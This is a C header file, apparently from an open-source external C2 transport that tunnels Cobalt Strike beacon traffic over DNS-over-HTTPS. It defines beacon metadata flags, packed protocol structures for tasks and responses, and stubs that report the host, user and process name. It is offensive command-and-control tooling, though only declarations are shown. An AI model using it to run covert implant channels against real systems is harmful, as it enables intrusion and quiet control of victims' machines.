/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

#define BEACON_LINK_NONE		0
#define BEACON_LINK_GOOD		1
#define BEACON_LINK_BROKEN		2

#define BEACON_METADATA_FLAG_NOTHING	1
#define BEACON_METADATA_FLAG_X64_AGENT	2
#define BEACON_METADATA_FLAG_SYSTEM	4
#define BEACON_METADATA_FLAG_ADMIN	8

#define BEACON_METADATA_MAGIC		0x0000beef

typedef struct __attribute__((packed, scalar_storage_order("big-endian")))
{
	ULONG	uMagic;
	ULONG	Length;
	UCHAR	Buffer[0];
} BEACON_METADATA_HDR, *PBEACON_METADATA_HDR;

typedef struct __attribute__((packed, scalar_storage_order("big-endian")))
{
	ULONG	Counter;
	ULONG	Length;
	UCHAR	Buffer[0];
} BEACON_TASK_REQ_HDR, *PBEACON_TASK_REQ_HDR;

typedef struct __attribute__((packed, scalar_storage_order("big-endian")))
{
	ULONG	CallId;
	ULONG	ArgLength;
	UCHAR	Buffer[0];
} BEACON_TASK_REQ_BUF, *PBEACON_TASK_REQ_BUF;

typedef struct __attribute__((packed, scalar_storage_order("big-endian")))
{
	ULONG	Counter;
	ULONG	Length;
	ULONG	CallId;
	UCHAR	Buffer[0];
} BEACON_TASK_RES_HDR, *PBEACON_TASK_RES_HDR;

typedef struct __attribute__((packed, scalar_storage_order("big-endian")))
{
	ULONG	Length;
	UCHAR	Buffer[0];
} BEACON_TASK_ENC_HDR, *PBEACON_TASK_ENC_HDR;

/*-
 *
 * BeaconComputer
 *
 * Purpose:
 *
 * Returns a string containing the name
 * of the computer Beacon is running on
 *
-*/
DEFINESEC(B) PVOID BeaconComputer( PBEACON_INSTANCE Ins );

/*-
 *
 * BeaconUsername
 *
 * Returns a string containing the name
 * of the user that Beacon is running
 * as.
 *
-*/
DEFINESEC(B) PVOID BeaconUsername( PBEACON_INSTANCE Ins );

/*-
 *
 * BeaconProcess
 *
 * Purpose:
 *
 * Returns a string containing the
 * Beacon process name in ANSI.
 *
-*/
DEFINESEC(B) PVOID BeaconProcess( PBEACON_INSTANCE Ins );
